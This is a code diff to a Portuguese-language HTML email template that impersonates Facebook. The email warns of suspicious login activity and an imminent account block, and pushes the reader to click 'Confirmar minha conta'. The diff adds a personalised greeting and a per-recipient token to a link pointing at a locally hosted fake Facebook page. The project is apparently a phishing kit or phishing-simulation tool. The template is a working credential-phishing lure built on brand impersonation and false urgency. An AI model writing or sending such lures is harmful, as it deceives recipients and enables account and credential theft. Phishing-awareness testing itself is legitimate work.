@@ -20,9 +20,10 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
         </div>
         <h2>Atenção: atividade suspeita detectada</h2>
+        <p>Olá, {{nome}}!</p>
         <p>Detectamos uma tentativa de acesso suspeita à sua conta do Facebook. Por segurança, sua conta será temporariamente bloqueada.</p>
         <p>Evite o bloqueio confirmando sua identidade:</p>
-        <a href="http://localhost:8000/facebook/index.html" class="button">Confirmar minha conta</a>
+    <a href="http://localhost:8000/facebook/index.html?token={{token}}" class="button">Confirmar minha conta</a>
         <p style="margin-top: 30px; font-size: 12px; color: gray;">© 2025 Facebook Inc.</p>
     </div>
 </body>
